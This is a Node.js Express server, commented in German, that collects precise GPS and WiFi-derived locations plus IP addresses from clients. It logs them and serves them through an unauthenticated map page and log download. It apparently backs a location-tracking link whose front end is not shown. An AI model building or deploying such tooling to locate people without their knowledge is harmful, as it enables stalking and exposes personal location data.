const cors = require('cors');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const fetch = require('node-fetch'); // WICHTIG: Neu hinzugefügt für API-Aufrufe

const IV_LENGTH = 16;
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY?.trim();

// Google API Key aus Umgebungsvariablen
const GOOGLE_API_KEY = process.env.GOOGLE_API_KEY;

if (!ENCRYPTION_KEY || !/^[a-f0-9]{64}$/i.test(ENCRYPTION_KEY)) {
    throw new Error('❌ ENCRYPTION_KEY muss genau 64 hex-Zeichen (0-9,a-f) enthalten!');
}

// 🔥 1. Verschlüsselungsfunktion
function encrypt(text) {
    try {
        const iv = crypto.randomBytes(IV_LENGTH);
        const cipher = crypto.createCipheriv(
            'aes-256-cbc',
            Buffer.from(ENCRYPTION_KEY, 'hex'),
            iv
        );
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return iv.toString('hex') + ':' + encrypted;
    } catch (err) {
        console.error('🔴 Encryption-Fehler:', err);
        throw err;
    }
}

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_DIR = path.join(__dirname, 'logs');

// 🔥 2. Middlewares
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

// Rate Limiting
const limiter = require('express-rate-limit')({
    windowMs: 15 * 60 * 1000,
    max: 100,
    keyGenerator: (req) => req.headers['x-real-ip'] || req.ip
});

// 🔥 3. Endpoints für präzises Tracking
app.post('/submit-gps', limiter, async (req, res) => {
    try {
        const { lat, lng, accuracy } = req.body;
        
        const trackingData = {
            timestamp: new Date().toISOString(),
            method: 'GPS',
            coordinates: {
                lat: parseFloat(lat).toFixed(6),
                lng: parseFloat(lng).toFixed(6),
                accuracy: parseInt(accuracy) || null
            },
            ip: req.headers['x-real-ip'] || req.ip
        };

        logData(trackingData);
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ GPS-Fehler:', error);
        res.status(500).json({ error: "GPS-Daten konnten nicht verarbeitet werden" });
    }
});

app.post('/submit-wifi', limiter, async (req, res) => {
    try {
        const { wifiAccessPoints } = req.body;
        
        if (!GOOGLE_API_KEY) {
            throw new Error('Google API Key fehlt');
        }

        const response = await fetch(`https://www.googleapis.com/geolocation/v1/geolocate?key=${GOOGLE_API_KEY}`, {
            method: 'POST',
            body: JSON.stringify({ wifiAccessPoints })
        });

        const { location, accuracy } = await response.json();
        
        const trackingData = {
            timestamp: new Date().toISOString(),
            method: 'WIFI',
            coordinates: {
                lat: location.lat,
                lng: location.lng,
                accuracy: parseInt(accuracy) || null
            },
            ip: req.headers['x-real-ip'] || req.ip
        };

        logData(trackingData);
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ WiFi-Fehler:', error);
        res.status(500).json({ error: "WiFi-Ortung fehlgeschlagen" });
    }
});

// 🔥 4. Hilfsfunktion für Logging
function logData(data) {
    const logEntry = JSON.stringify(data);
    
    // Standard-Log
    fs.appendFileSync(
        path.join(LOG_DIR, 'tracking.log'),
        logEntry + '\n'
    );

    // Verschlüsseltes Backup (nur auf Render)
    if (process.env.RENDER) {
        fs.appendFileSync(
            path.join(LOG_DIR, 'backup.log'),
            encrypt(logEntry) + '\n'
        );
    }

    console.log('📡 Empfangene Daten:', data.method, data.coordinates);
}

// 🔥 5. Dashboard-Endpoints (optional)
app.get('/map', (req, res) => {
    try {
        const logs = fs.readFileSync(path.join(LOG_DIR, 'tracking.log'), 'utf-8')
            .split('\n')
            .filter(Boolean)
            .map(JSON.parse);
        
        const html = logs.map(log => 
            log.coordinates 
                ? `<a href="https://www.google.com/maps?q=${log.coordinates.lat},${log.coordinates.lng}" target="_blank">
                     ${log.timestamp} (${log.method}, Genauigkeit: ${log.coordinates.accuracy}m)
                   </a><br>`
                : ''
        ).join('');
        
        res.send(`<html><body>${html || 'Keine Tracking-Daten gefunden'}</body></html>`);
    } catch (error) {
        res.status(500).send("Fehler beim Lesen der Logs");
    }
});

app.get('/download-logs', (req, res) => {
    try {
        res.download(path.join(LOG_DIR, 'tracking.log'), 'tracking-data.json');
    } catch (error) {
        res.status(500).send("Log-Download fehlgeschlagen");
    }
});

// 🚀 Server starten
app.listen(PORT, () => {
    console.log(`🚀 Server läuft auf Port ${PORT}`);
    console.log(`🔑 Encryption-Key: ${ENCRYPTION_KEY?.slice(0, 6)}...`);
    if (!GOOGLE_API_KEY) console.warn('❌ Google API Key fehlt - WiFi-Ortung deaktiviert');
});
